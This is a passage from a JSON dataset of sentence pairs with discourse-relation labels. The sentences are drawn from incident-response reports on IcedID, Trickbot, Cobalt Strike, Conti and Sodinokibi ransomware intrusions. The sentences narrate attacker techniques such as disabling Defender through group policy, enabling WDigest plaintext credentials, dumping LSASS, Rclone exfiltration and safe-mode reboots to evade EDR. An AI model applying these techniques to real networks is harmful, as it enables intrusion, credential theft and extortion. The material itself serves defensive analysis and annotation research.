        "S1": "We also observed connection from [kthreaddi].exe talking to crypto mining pools",
        "S2": "Eventually, the crypto mining operation will cause performance issue with the WebLogic server.",
        "relation": "NEXT"
    },
    {
        "S1": "We assess with moderate confidence that the initial vector used by the threat actor was a zip file, which included a malicious JavaScript file, delivered through a phishing campaign.",
        "S2": "The JavaScript file would eventually download and execute the IcedID malware.",
        "relation": "NEXT"
    },
    {
        "S1": "The JavaScript file would eventually download and execute the IcedID malware.",
        "S2": "Discovered in 2017, what started as a commodity malware is now currently being deployed as an initial access broker by ransomware threat actors.",
        "relation": "MISC"
    },
    {
        "S1": "Discovered in 2017, what started as a commodity malware is now currently being deployed as an initial access broker by ransomware threat actors.",
        "S2": "While there was some initial discovery activity from the IcedID malware, it went quiet, just beaconing to command and control but not performing any other activity.",
        "relation": "MISC"
    },
    {
        "S1": "While there was some initial discovery activity from the IcedID malware, it went quiet, just beaconing to command and control but not performing any other activity.",
        "S2": "After being dormant for over two days, a Cobalt Strike Beacon was dropped and executed on the system infected with IcedID.",
        "relation": "NEXT"
    },
    {
        "S1": "After being dormant for over two days, a Cobalt Strike Beacon was dropped and executed on the system infected with IcedID.",
        "S2": "The threat actors then ran another round of discovery activity with native windows utilities such as nltest.exe, whoami.exe, and net.exe.",
        "relation": "NEXT"
    },
    {
        "S1": "The threat actors then ran another round of discovery activity with native windows utilities such as nltest.exe, whoami.exe, and net.exe.",
        "S2": "They then successfully escalated to SYSTEM privileges via Cobalt Strike\u2019s built-in \u201cnamed pipe impersonation\u201d (GetSystem) functionality.",
        "relation": "NEXT"
    },
    {
        "S1": "They then successfully escalated to SYSTEM privileges via Cobalt Strike\u2019s built-in \u201cnamed pipe impersonation\u201d (GetSystem) functionality.",
        "S2": "The threat actors continued by moving laterally to the domain controllers on the network using SMB to transfer and execute a Cobalt Strike Beacon.",
        "relation": "NEXT"
    },
    {
        "S1": "The threat actors continued by moving laterally to the domain controllers on the network using SMB to transfer and execute a Cobalt Strike Beacon.",
        "S2": "During that time, we observed port scanning activity from one of the domain controllers, to identify open ports such as SSH, SMB, MSSQL, RDP and WinRM.",
        "relation": "ELABORATION"
    },
    {
        "S1": "During that time, we observed port scanning activity from one of the domain controllers, to identify open ports such as SSH, SMB, MSSQL, RDP and WinRM.",
        "S2": "After a brief gap of 15 minutes, the threat actors used PsExec, to copy and execute a Cobalt Strike Beacon DLL on most of the systems in the network.",
        "relation": "NEXT"
    },
    {
        "S1": "After a brief gap of 15 minutes, the threat actors used PsExec, to copy and execute a Cobalt Strike Beacon DLL on most of the systems in the network.",
        "S2": "Later in the attack, the threat actor was seen establishing RDP connections from the beachhead host to the domain controller and other systems throughout the environment.",
        "relation": "NEXT"
    },
    {
        "S1": "Later in the attack, the threat actor was seen establishing RDP connections from the beachhead host to the domain controller and other systems throughout the environment.",
        "S2": "This RDP activity was being proxied through the IcedID process running on that host, to a remote proxy over port 8080.",
        "relation": "ELABORATION"
    },
    {
        "S1": "This RDP activity was being proxied through the IcedID process running on that host, to a remote proxy over port 8080.",
        "S2": "To establish persistence, the attackers created a new local user on one of the domain controllers and added it to the Administrators group.",
        "relation": "NEXT"
    },
    {
        "S1": "To establish persistence, the attackers created a new local user on one of the domain controllers and added it to the Administrators group.",
        "S2": "Additionally, in an effort to evade any detection and prevention mechanisms, they disabled Windows Defender via a group policy modification.",
        "relation": "NEXT"
    },
    {
        "S1": "Additionally, in an effort to evade any detection and prevention mechanisms, they disabled Windows Defender via a group policy modification.",
        "S2": "Within two and a half hours of Cobalt Strike showing up in the environment and just over two days after the initial IcedID infection, the threat actors completed their objective of encrypting all systems.",
        "relation": "NEXT"
    },
    {
        "S1": "Within two and a half hours of Cobalt Strike showing up in the environment and just over two days after the initial IcedID infection, the threat actors completed their objective of encrypting all systems.",
        "S2": "Conti was executed in memory with the help of the Cobalt Strike Beacons domain wide.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Conti was executed in memory with the help of the Cobalt Strike Beacons domain wide.",
        "S2": "The ransomware note left by the infection included a link to their Tor site for further details.",
        "relation": "NEXT"
    },
    {
        "S1": "The ransomware note left by the infection included a link to their Tor site for further details.",
        "S2": "After further review of the environment (post encryption), we realized multiple systems (including a domain controller) were unable to be accessed and would not have been restorable even if the ransom had been paid.",
        "relation": "ELABORATION"
    },
    {
        "S1": "After further review of the environment (post encryption), we realized multiple systems (including a domain controller) were unable to be accessed and would not have been restorable even if the ransom had been paid.",
        "S2": "The IcedID DLL that we executed was most likely dropped through a zip file, which included a JavaScript file within it.",
        "relation": "MISC"
    },
    {
        "S1": "The IcedID DLL that we executed was most likely dropped through a zip file, which included a JavaScript file within it.",
        "S2": "Brad had a few posts about these around the time of this intrusion.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Brad had a few posts about these around the time of this intrusion.",
        "S2": "1 2",
        "relation": "MISC"
    },
    {
        "S1": "1 2",
        "S2": "Thanks Brad!",
        "relation": "MISC"
    },
    {
        "S1": "Thanks Brad!",
        "S2": "Various attributes including the computer name and the OS version of the compromised system were sent through encoded cookie values.",
        "relation": "MISC"
    },
    {
        "S1": "Various attributes including the computer name and the OS version of the compromised system were sent through encoded cookie values.",
        "S2": "IcedID was executed via rundll32.exe and ran command and control over port 443 for the duration of the intrusion.",
        "relation": "MISC"
    },
    {
        "S1": "IcedID was executed via rundll32.exe and ran command and control over port 443 for the duration of the intrusion.",
        "S2": "IcedID ran initial discovery after being executed on the beachhead.",
        "relation": "NEXT"
    },
    {
        "S1": "IcedID ran initial discovery after being executed on the beachhead.",
        "S2": "Various commands were executed to gather more information about the compromised environment; including the currently logged on user, domain trusts, groups, etc .",
        "relation": "NEXT"
    },
    {
        "S1": "Various commands were executed to gather more information about the compromised environment; including the currently logged on user, domain trusts, groups, etc .",
        "S2": "Additional discovery commands were executed by Cobalt Strike.",
        "relation": "NEXT"
    },
    {
        "S1": "Additional discovery commands were executed by Cobalt Strike.",
        "S2": "After moving laterally to a domain controller, they began looking for what networks were present in the environment using dsquery.",
        "relation": "NEXT"
    },
    {
        "S1": "After moving laterally to a domain controller, they began looking for what networks were present in the environment using dsquery.",
        "S2": "Shortly thereafter, port scanning was observed coming from a domain controller looking for common ports (such as SSH, SMB, MSSQL, WinRM and RDP, etc.) on systems residing in the same subnet.",
        "relation": "NEXT"
    },
    {
        "S1": "Shortly thereafter, port scanning was observed coming from a domain controller looking for common ports (such as SSH, SMB, MSSQL, WinRM and RDP, etc.) on systems residing in the same subnet.",
        "S2": "In order to obtain SYSTEM level privileges, Cobalt Strike\u2019s built-in named piped impersonation (GetSystem) was used:",
        "relation": "NEXT"
    },
    {
        "S1": "In order to obtain SYSTEM level privileges, Cobalt Strike\u2019s built-in named piped impersonation (GetSystem) was used:",
        "S2": "The threat actor began lateral movement using remote execution of Cobalt Strike Beacon service binaries.",
        "relation": "NEXT"
    },
    {
        "S1": "The threat actor began lateral movement using remote execution of Cobalt Strike Beacon service binaries.",
        "S2": "After this initial activity, Cobalt Strike was used to enable RDP, and allow it through the firewall, on the domain controllers.",
        "relation": "NEXT"
    },
    {
        "S1": "After this initial activity, Cobalt Strike was used to enable RDP, and allow it through the firewall, on the domain controllers.",
        "S2": "Following this, the threat actors then copied a Cobalt Strike Beacon DLL to the ADMIN$ share; and then, distributed it throughout the environment using PsExec.",
        "relation": "NEXT"
    },
    {
        "S1": "Following this, the threat actors then copied a Cobalt Strike Beacon DLL to the ADMIN$ share; and then, distributed it throughout the environment using PsExec.",
        "S2": "From here, RDP connections were established from the beachhead host to systems throughout the environment.",
        "relation": "NEXT"
    },
    {
        "S1": "From here, RDP connections were established from the beachhead host to systems throughout the environment.",
        "S2": "The connections were proxied through the IcedID process.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The connections were proxied through the IcedID process.",
        "S2": "The threat actor used a redirector (38.135.122[.]194:8080) to proxy the RDP traffic being passed through the IcedID process.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The threat actor used a redirector (38.135.122[.]194:8080) to proxy the RDP traffic being passed through the IcedID process.",
        "S2": "The below traffic shows more details of the RDP session, including the username in the cookie.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The below traffic shows more details of the RDP session, including the username in the cookie.",
        "S2": "This proxied traffic reported back the hostname of the threat actors machine as \u201cmikespc\u201d.",
        "relation": "ELABORATION"
    },
    {
        "S1": "This proxied traffic reported back the hostname of the threat actors machine as \u201cmikespc\u201d.",
        "S2": "We\u2019re looking for you Mike! \ud83d\ude09",
        "relation": "MISC"
    },
    {
        "S1": "We\u2019re looking for you Mike! \ud83d\ude09",
        "S2": "To evade detection, the threat actors disabled Windows Defender by adding the below to an already linked GPO.",
        "relation": "MISC"
    },
    {
        "S1": "To evade detection, the threat actors disabled Windows Defender by adding the below to an already linked GPO.",
        "S2": "They then force updated the GPO on all clients using Cobalt Strike.",
        "relation": "NEXT"
    },
    {
        "S1": "They then force updated the GPO on all clients using Cobalt Strike.",
        "S2": "In addition, other security services were stopped or uninstalled.",
        "relation": "NEXT"
    },
    {
        "S1": "In addition, other security services were stopped or uninstalled.",
        "S2": "An account named \u201cnuuser\u201d was created by one of the Cobalt Strike Beacons.",
        "relation": "NEXT"
    },
    {
        "S1": "An account named \u201cnuuser\u201d was created by one of the Cobalt Strike Beacons.",
        "S2": "As these commands were run on a domain controller, it essentially added the account to the Built-in Administrators domain group, granting it administrative privileges in the AD domain.",
        "relation": "ELABORATION"
    },
    {
        "S1": "As these commands were run on a domain controller, it essentially added the account to the Built-in Administrators domain group, granting it administrative privileges in the AD domain.",
        "S2": "LSASS was accessed by an unusual process \u201crunonce.exe\u201d on multiple hosts, including a domain controller.",
        "relation": "NEXT"
    },
    {
        "S1": "LSASS was accessed by an unusual process \u201crunonce.exe\u201d on multiple hosts, including a domain controller.",
        "S2": "The overpass-the hash technique was used to acquire a valid Kerberos ticket for the administrator user.",
        "relation": "LIST"
    },
    {
        "S1": "The overpass-the hash technique was used to acquire a valid Kerberos ticket for the administrator user.",
        "S2": "About two and a half hours after initial hands on keyboard activity, the Cobalt Strike Beacon processes running across the target systems injected the Conti DLL into memory.",
        "relation": "NEXT"
    },
    {
        "S1": "About two and a half hours after initial hands on keyboard activity, the Cobalt Strike Beacon processes running across the target systems injected the Conti DLL into memory.",
        "S2": "Conti deployments using a DLL seem to have first started showing up in December 2020.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Conti deployments using a DLL seem to have first started showing up in December 2020.",
        "S2": "First time that I see #Conti ransomware spread as a DLL :",
        "relation": "ELABORATION"
    },
    {
        "S1": "First time that I see #Conti ransomware spread as a DLL :",
        "S2": "Some traces of this particular DLL were found in the memory dump taken from one of the compromised systems.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Some traces of this particular DLL were found in the memory dump taken from one of the compromised systems.",
        "S2": "We were unable to reconstruct the DLL from memory but Maxime Thiebaut (@0xThiebaut) from NVISO helped us out.",
        "relation": "ELABORATION"
    },
    {
        "S1": "We were unable to reconstruct the DLL from memory but Maxime Thiebaut (@0xThiebaut) from NVISO helped us out.",
        "S2": "The Yara rule, located in the detections section below was made possible due to him reconstructing the DLL.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The Yara rule, located in the detections section below was made possible due to him reconstructing the DLL.",
        "S2": "Thanks Maxime!",
        "relation": "ELABORATION"
    },
    {
        "S1": "Thanks Maxime!",
        "S2": "Conti scans the network for 445/SMB, looking for machines to encrypt.",
        "relation": "MISC"
    },
    {
        "S1": "Conti scans the network for 445/SMB, looking for machines to encrypt.",
        "S2": "Ransom note",
        "relation": "NEXT"
    },
    {
        "S1": "Ransom note",
        "S2": "Which leads you here.",
        "relation": "MISC"
    },
    {
        "S1": "Which leads you here.",
        "S2": "The threat actors asked for 150k and could have been talked down at least ~20%.",
        "relation": "MISC"
    },
    {
        "S1": "The threat actors asked for 150k and could have been talked down at least ~20%.",
        "S2": "Multiple machines within the environment were not usable after being ransomed including a domain controller.",
        "relation": "MISC"
    },
    {
        "S1": "Multiple machines within the environment were not usable after being ransomed including a domain controller.",
        "S2": "The machines were left like this and you were not able to do anything but press control+alt+delete.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The machines were left like this and you were not able to do anything but press control+alt+delete.",
        "S2": "Paying the ransom will not help you here.",
        "relation": "ELABORATION"
    },
    {
        "S1": "We assess, with moderate confidence, the Trickbot DLL that we executed was originally delivered via a malicious Office document.",
        "S2": "The threat actors were observed leveraging Trickbot and Cobalt Strike for C2 communication.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The threat actors were observed leveraging Trickbot and Cobalt Strike for C2 communication.",
        "S2": "They began their discovery by running net and nltest commands as well as PowerView domain discovery modules.",
        "relation": "ELABORATION"
    },
    {
        "S1": "They began their discovery by running net and nltest commands as well as PowerView domain discovery modules.",
        "S2": "Minutes later, Lazagne (\u201cretrieve lots of passwords\u201d)",
        "relation": "NEXT"
    },
    {
        "S1": "Minutes later, Lazagne (\u201cretrieve lots of passwords\u201d)",
        "S2": "was executed using the \u201call\u201d switch.",
        "relation": "MISC"
    },
    {
        "S1": "was executed using the \u201call\u201d switch.",
        "S2": "A registry value was set to enable storing logon credentials in plaintext in memory (WDigest), likely to facilitate future activity as the host was not restarted for this change to take effect.",
        "relation": "MISC"
    },
    {
        "S1": "A registry value was set to enable storing logon credentials in plaintext in memory (WDigest), likely to facilitate future activity as the host was not restarted for this change to take effect.",
        "S2": "Before the threat actors departed the network, they successfully accessed the LSASS process and retrieved credentials from memory.",
        "relation": "NEXT"
    },
    {
        "S1": "Before the threat actors departed the network, they successfully accessed the LSASS process and retrieved credentials from memory.",
        "S2": "No lateral movement or execution on mission was observed.",
        "relation": "ELABORATION"
    },
    {
        "S1": "No lateral movement or execution on mission was observed.",
        "S2": "We assess with moderate confidence that this DLL was dropped by a malicious Office document.",
        "relation": "MISC"
    },
    {
        "S1": "We assess with moderate confidence that this DLL was dropped by a malicious Office document.",
        "S2": "Trickbot (click.php.dll) was manually executed on a single endpoint.",
        "relation": "NEXT"
    },
    {
        "S1": "Trickbot (click.php.dll) was manually executed on a single endpoint.",
        "S2": "Source: https://tria.ge/210412-wmdnkzp5la",
        "relation": "MISC"
    },
    {
        "S1": "Source: https://tria.ge/210412-wmdnkzp5la",
        "S2": "Trickbot, from its injected wermgr process, spawned a command process to then run a PowerShell Cobalt Strike Beacon.",
        "relation": "MISC"
    },
    {
        "S1": "Trickbot, from its injected wermgr process, spawned a command process to then run a PowerShell Cobalt Strike Beacon.",
        "S2": "Reviewing the above PowerShell code, we can extract the shellcode to discover the IP and User-agent string, the beacon will communicate with.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Reviewing the above PowerShell code, we can extract the shellcode to discover the IP and User-agent string, the beacon will communicate with.",
        "S2": "Getting the IP and port using scdbg.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Getting the IP and port using scdbg.",
        "S2": "The threat actor also executed a second Cobalt Strike Beacon (wsuC3C.tmp) using the injected wermgr.exe process.",
        "relation": "MISC"
    },
    {
        "S1": "The threat actor also executed a second Cobalt Strike Beacon (wsuC3C.tmp) using the injected wermgr.exe process.",
        "S2": "A scheduled task was created to keep the Trickbot malware persistent on the system.",
        "relation": "NEXT"
    },
    {
        "S1": "A scheduled task was created to keep the Trickbot malware persistent on the system.",
        "S2": "Trickbot injected into wermgr.exe processes and used this for communication to command and control infrastructure.",
        "relation": "NEXT"
    },
    {
        "S1": "Trickbot injected into wermgr.exe processes and used this for communication to command and control infrastructure.",
        "S2": "Lazagne was used with the \u201call\u201d switch, which runs all modules.",
        "relation": "NEXT"
    },
    {
        "S1": "Lazagne was used with the \u201call\u201d switch, which runs all modules.",
        "S2": "Below we can see registry hives being saved to disk.",
        "relation": "NEXT"
    },
    {
        "S1": "Below we can see registry hives being saved to disk.",
        "S2": "LSASS was accessed by rundll32, but we did not see anything written to disk.",
        "relation": "NEXT"
    },
    {
        "S1": "LSASS was accessed by rundll32, but we did not see anything written to disk.",
        "S2": "Trickbot was used to enable the storage of clear text credentials (WDigest) by setting UseLogonCredential to 1.",
        "relation": "LIST"
    },
    {
        "S1": "Trickbot was used to enable the storage of clear text credentials (WDigest) by setting UseLogonCredential to 1.",
        "S2": "The following net commands were used by the threat actor from the injected Trickbot process.",
        "relation": "MISC"
    },
    {
        "S1": "The following net commands were used by the threat actor from the injected Trickbot process.",
        "S2": "The following nltest commands were used by the threat actor from the injected Trickbot process.",
        "relation": "LIST"
    },
    {
        "S1": "The following nltest commands were used by the threat actor from the injected Trickbot process.",
        "S2": "PowerView modules were also used by the threat actor executed from the Cobalt Strike beacons.",
        "relation": "LIST"
    },
    {
        "S1": "PowerView modules were also used by the threat actor executed from the Cobalt Strike beacons.",
        "S2": "The local network was scanned for port 445/SMB.",
        "relation": "MISC"
    },
    {
        "S1": "The local network was scanned for port 445/SMB.",
        "S2": "ipconfig was used to show all IP info.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The IcedID trojan was first discovered in 2017 and currently operates as an initial access broker for several ransomware families.",
        "S2": "In our intrusion, the threat actors leveraged malicious spam using an xlsm document which, upon opening and enabling the macro, initiated a wmic command to execute the IcedID trojan from a remote executable posing as a GIF image.",
        "relation": "NEXT"
    },
    {
        "S1": "In our intrusion, the threat actors leveraged malicious spam using an xlsm document which, upon opening and enabling the macro, initiated a wmic command to execute the IcedID trojan from a remote executable posing as a GIF image.",
        "S2": "Persistence was setup using a scheduled task and discovery commands were initiated from the malware within minutes of execution.",
        "relation": "NEXT"
    },
    {
        "S1": "Persistence was setup using a scheduled task and discovery commands were initiated from the malware within minutes of execution.",
        "S2": "About an hour and a half after initial access, the malware pulled down Cobalt Strike Beacons from 2 different command and control servers, which were both used through-out the intrusion.",
        "relation": "NEXT"
    },
    {
        "S1": "About an hour and a half after initial access, the malware pulled down Cobalt Strike Beacons from 2 different command and control servers, which were both used through-out the intrusion.",
        "S2": "Once the Cobalt Strike Beacons were established, lateral movement began, first to an Exchange server, then pivoting to other servers.",
        "relation": "NEXT"
    },
    {
        "S1": "Once the Cobalt Strike Beacons were established, lateral movement began, first to an Exchange server, then pivoting to other servers.",
        "S2": "We did not see the attackers interact with the Exchange application at all; and at first, it appeared the attack came from Exchange, but after careful review, we assessed the source was indeed IcedID.",
        "relation": "ELABORATION"
    },
    {
        "S1": "We did not see the attackers interact with the Exchange application at all; and at first, it appeared the attack came from Exchange, but after careful review, we assessed the source was indeed IcedID.",
        "S2": "#ArtifactsMatter.",
        "relation": "MISC"
    },
    {
        "S1": "#ArtifactsMatter.",
        "S2": "It appears the threat actors wanted us to believe Exchange was the source of attack as they pivoted through Exchange to other systems in the domain using Cobalt Strike.",
        "relation": "MISC"
    },
    {
        "S1": "It appears the threat actors wanted us to believe Exchange was the source of attack as they pivoted through Exchange to other systems in the domain using Cobalt Strike.",
        "S2": "After compromising the Exchange server, the attackers moved to domain controllers and other systems within the environment using SMB and PowerShell Beacons executed via a remote service.",
        "relation": "NEXT"
    },
    {
        "S1": "After compromising the Exchange server, the attackers moved to domain controllers and other systems within the environment using SMB and PowerShell Beacons executed via a remote service.",
        "S2": "The attackers were slightly slowed down by AntiVirus, which ate a couple Beacons but the attackers eventually bypassed it using a variation of their lateral movement technique.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The attackers were slightly slowed down by AntiVirus, which ate a couple Beacons but the attackers eventually bypassed it using a variation of their lateral movement technique.",
        "S2": "Additional discovery was executed from the domain controller using AdFind and the Ping utility to test connections between the domain controller and other domain joined systems.",
        "relation": "NEXT"
    },
    {
        "S1": "Additional discovery was executed from the domain controller using AdFind and the Ping utility to test connections between the domain controller and other domain joined systems.",
        "S2": "After discovery was completed, credentials were dumped from lsass.",
        "relation": "NEXT"
    },
    {
        "S1": "After discovery was completed, credentials were dumped from lsass.",
        "S2": "After completing these tasks the threat actors began to establish RDP connections between various systems in the domain.",
        "relation": "NEXT"
    },
    {
        "S1": "After completing these tasks the threat actors began to establish RDP connections between various systems in the domain.",
        "S2": "Three and a half hours into the intrusion, the threat actors used Rclone masquerading as a svchost executable to collect and exfiltrate the contents of network shares for use in a double extortion demand.",
        "relation": "NEXT"
    },
    {
        "S1": "Three and a half hours into the intrusion, the threat actors used Rclone masquerading as a svchost executable to collect and exfiltrate the contents of network shares for use in a double extortion demand.",
        "S2": "At the four hour mark, the threat actors began to move on to final objectives.",
        "relation": "NEXT"
    },
    {
        "S1": "At the four hour mark, the threat actors began to move on to final objectives.",
        "S2": "They staged the ransomware executable on a domain controller and then used BITSAdmin to download it to each system in the domain.",
        "relation": "NEXT"
    },
    {
        "S1": "They staged the ransomware executable on a domain controller and then used BITSAdmin to download it to each system in the domain.",
        "S2": "After that, the threat actors used RDP to open a cmd or PowerShell process to then execute the Sodinokibi ransomware using a particular flag -smode, which when executed, wrote a couple RunOnce registry keys and then immediately rebooted the system into Safe Mode with Networking.",
        "relation": "NEXT"
    },
    {
        "S1": "After that, the threat actors used RDP to open a cmd or PowerShell process to then execute the Sodinokibi ransomware using a particular flag -smode, which when executed, wrote a couple RunOnce registry keys and then immediately rebooted the system into Safe Mode with Networking.",
        "S2": "Encryption did not start immediately after reboot but required a user to log in, which in this case the threat actors completed by logging in after the reboot.",
        "relation": "NEXT"
    },
    {
        "S1": "Encryption did not start immediately after reboot but required a user to log in, which in this case the threat actors completed by logging in after the reboot.",
        "S2": "Booting into Safe Mode with Networking blocked the startup of security tools and other management agents.",
        "relation": "NEXT"
    },
    {
        "S1": "Booting into Safe Mode with Networking blocked the startup of security tools and other management agents.",
        "S2": "Networking worked, but because services couldn\u2019t start, we were unable to remotely manage the systems using our normal tools.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Networking worked, but because services couldn\u2019t start, we were unable to remotely manage the systems using our normal tools.",
        "S2": "We believe this process would have stopped some EDR agents from starting up and possibly detecting the ransomware execution.",
        "relation": "ELABORATION"
    },
    {
        "S1": "We believe this process would have stopped some EDR agents from starting up and possibly detecting the ransomware execution.",
        "S2": "On certain systems, ransomware was executed without the -smode flag, and on other systems a dll was executed via rundll32 to encrypt the system without requiring a reboot and allowing the threat actors to remain present while the encryption process completed.",
        "relation": "ELABORATION"
    },
    {
        "S1": "On certain systems, ransomware was executed without the -smode flag, and on other systems a dll was executed via rundll32 to encrypt the system without requiring a reboot and allowing the threat actors to remain present while the encryption process completed.",
        "S2": "About 4.5 hours after initial access, the threat actors had completed their mission of encrypting all domain joined systems.",
        "relation": "MISC"
    },
    {
        "S1": "About 4.5 hours after initial access, the threat actors had completed their mission of encrypting all domain joined systems.",
        "S2": "The ransomware note left by the infection included a link to their site on Tor which put the price tag for decryption around $200k if paid within 7 days.",
        "relation": "NEXT"
    },
    {
        "S1": "The ransomware note left by the infection included a link to their site on Tor which put the price tag for decryption around $200k if paid within 7 days.",
        "S2": "If we didn\u2019t pay within 7 days the price goes up to around $400k.",
        "relation": "ELABORATION"
    },
    {
        "S1": "If we didn\u2019t pay within 7 days the price goes up to around $400k.",
        "S2": "The ransom is required to be paid in Monero instead of the usual Bitcoin.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The ransom is required to be paid in Monero instead of the usual Bitcoin.",
        "S2": "This may be in an effort to better shield the payments from tracing activity like those performed by Chainaylsis.",
        "relation": "ELABORATION"
    },
    {
        "S1": "This may be in an effort to better shield the payments from tracing activity like those performed by Chainaylsis.",
        "S2": "The threat actors identified themselves on their site as Sodinokibi and linked to a Coveware blog to provide assurance that if paid their decryption would be successful.",
        "relation": "MISC"
    },
    {
        "S1": "The threat actors identified themselves on their site as Sodinokibi and linked to a Coveware blog to provide assurance that if paid their decryption would be successful.",
        "S2": "Initial access for this intrusion was via a malspam campaign, while expecting Qbot downloads we found that IcedID was the payload choice delivered this time, similar to activity noted recently by James Quinn.",
        "relation": "MISC"
    },
    {
        "S1": "Initial access for this intrusion was via a malspam campaign, while expecting Qbot downloads we found that IcedID was the payload choice delivered this time, similar to activity noted recently by James Quinn.",
        "S2": "The delivery format was an xlsm file:",
        "relation": "ELABORATION"
    },
    {
        "S1": "The delivery format was an xlsm file:",
        "S2": "Initial execution of the document writes a file to:",
        "relation": "MISC"
    },
    {
        "S1": "Initial execution of the document writes a file to:",
        "S2": "The Excel file called wmic to execute the file with regsrv32",
        "relation": "NEXT"
    },
    {
        "S1": "The Excel file called wmic to execute the file with regsrv32",
        "S2": "This then made a network request to download a file from this URL",
        "relation": "NEXT"
    },
    {
        "S1": "This then made a network request to download a file from this URL",
        "S2": "The GIF however was the IcedID malware.",
        "relation": "MISC"
    },
    {
        "S1": "The GIF however was the IcedID malware.",
        "S2": "Once IcedID was downloaded to the host, the malware was executed using rundll32.exe",
        "relation": "ELABORATION"
    },
    {
        "S1": "Once IcedID was downloaded to the host, the malware was executed using rundll32.exe",
        "S2": "After execution, the malware made contact with 161.35.109[.]168 which it continued to beacon to, throughout the intrusion.",
        "relation": "NEXT"
    },
    {
        "S1": "After execution, the malware made contact with 161.35.109[.]168 which it continued to beacon to, throughout the intrusion.",
        "S2": "IcedID setup persistence on the beach head host using a scheduled task.",
        "relation": "NEXT"
    },
    {
        "S1": "IcedID setup persistence on the beach head host using a scheduled task.",
        "S2": "The execution of the ransomware executable created a RunOnce key for persistence.",
        "relation": "MISC"
    },
    {
        "S1": "The execution of the ransomware executable created a RunOnce key for persistence.",
        "S2": "After completing LDAP discovery (BloodHound), the Cobalt Strike Beacon running in the wuauclt.exe process executed several PowerShell functions for UAC bypasses including:",
        "relation": "MISC"
    },
    {
        "S1": "After completing LDAP discovery (BloodHound), the Cobalt Strike Beacon running in the wuauclt.exe process executed several PowerShell functions for UAC bypasses including:",
        "S2": "About one and a half hours after initial access, IcedID reached out to two Cobalt Strike servers.",
        "relation": "MISC"
    },
    {
        "S1": "About one and a half hours after initial access, IcedID reached out to two Cobalt Strike servers.",
        "S2": "Process injection was used multiple times across the environment using Cobalt Strike Beacons.",
        "relation": "MISC"
    },
    {
        "S1": "Process injection was used multiple times across the environment using Cobalt Strike Beacons.",
        "S2": "Prior to executing the ransomware, the threat actors created a GPO to disable Windows Defender across all systems/OUs.",
        "relation": "MISC"
    },
    {
        "S1": "Prior to executing the ransomware, the threat actors created a GPO to disable Windows Defender across all systems/OUs.",
        "S2": "The GPO was named \u201cnew\u201d.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The GPO was named \u201cnew\u201d.",
        "S2": "Credentials were dumped on a server and domain controller using a Cobalt Strike Beacon.",
        "relation": "MISC"
    },
    {
        "S1": "Credentials were dumped on a server and domain controller using a Cobalt Strike Beacon.",
        "S2": "Initial discovery by the IcedID malware occurred within minutes of execution:",
        "relation": "MISC"
    },
    {
        "S1": "Initial discovery by the IcedID malware occurred within minutes of execution:",
        "S2": "A flurry of LDAP queries were seen coming from wuauclt.exe (Cobalt Strike) on the beachhead.",
        "relation": "MISC"
    },
    {
        "S1": "A flurry of LDAP queries were seen coming from wuauclt.exe (Cobalt Strike) on the beachhead.",
        "S2": "We believe that activity was related to a Bloodhound scan, as seconds later we see BloodHound results dropped to disk before being deleted.",
        "relation": "MISC"
    },
    {
        "S1": "We believe that activity was related to a Bloodhound scan, as seconds later we see BloodHound results dropped to disk before being deleted.",
        "S2": "Once on the Exchange server in the environment, the threat actor performed DNS requests for all domain joined systems and pinged a few to check connectivity.",
        "relation": "MISC"
    },
    {
        "S1": "Once on the Exchange server in the environment, the threat actor performed DNS requests for all domain joined systems and pinged a few to check connectivity.",
        "S2": "AdFind was executed on a domain controller to gather additional info such as name, OS, and DNS name.",
        "relation": "MISC"
    },
    {
        "S1": "AdFind was executed on a domain controller to gather additional info such as name, OS, and DNS name.",
        "S2": "For lateral movement, the threat actors used various techniques across the domain, one method being Cobalt Strike.",
        "relation": "MISC"
    },
    {
        "S1": "For lateral movement, the threat actors used various techniques across the domain, one method being Cobalt Strike.",
        "S2": "Cobalt Strike Beacon executables were transferred using SMB and executed via a remote service.",
        "relation": "MISC"
    },
    {
        "S1": "Cobalt Strike Beacon executables were transferred using SMB and executed via a remote service.",
        "S2": "On other systems, PowerShell was used with the same remote service execution.",
        "relation": "MISC"
    },
    {
        "S1": "On other systems, PowerShell was used with the same remote service execution.",
        "S2": "To facilitate the final ransomware deployment, RDP connections were initiated from a domain controller as well as a secondary server in the environment.",
        "relation": "NEXT"
    },
    {
        "S1": "To facilitate the final ransomware deployment, RDP connections were initiated from a domain controller as well as a secondary server in the environment.",
        "S2": "The Rclone utility was used to collect information from file shares and to exfiltrate the data.",
        "relation": "MISC"
    },
    {
        "S1": "The Rclone utility was used to collect information from file shares and to exfiltrate the data.",
        "S2": "Data that was collected from the domain was exfiltrated to a remote server at:",
        "relation": "NEXT"
    },
    {
        "S1": "Data that was collected from the domain was exfiltrated to a remote server at:",
        "S2": "For the final actions, the threat actors dropped a ransomware executable on the domain controller in C:\\Windows and then used BITSAdmin to deploy the executable to remote systems.",
        "relation": "NEXT"
    },
    {
        "S1": "For the final actions, the threat actors dropped a ransomware executable on the domain controller in C:\\Windows and then used BITSAdmin to deploy the executable to remote systems.",
        "S2": "The -smode flag was used with the ransomware executable to set the system to reboot into Safe Mode with Networking as noted by Malwarehunterteam.",
        "relation": "NEXT"
    },
    {
        "S1": "The -smode flag was used with the ransomware executable to set the system to reboot into Safe Mode with Networking as noted by Malwarehunterteam.",
        "S2": "Not remember seeing these before in REvil ransomware samples.",
        "relation": "MISC"
    },
    {
        "S1": "Not remember seeing these before in REvil ransomware samples.",
        "S2": "\ud83e\udd14",
        "relation": "MISC"
    },
    {
        "S1": "\ud83e\udd14",
        "S2": "So basically the actors using REvil now can use it to reboot target machines into safe mode with networking\u2026@demonslay335 @VK_Intel pic.twitter.com/dLk4EirNFO \u2014 MalwareHunterTeam (@malwrhunterteam) March 18, 2021",
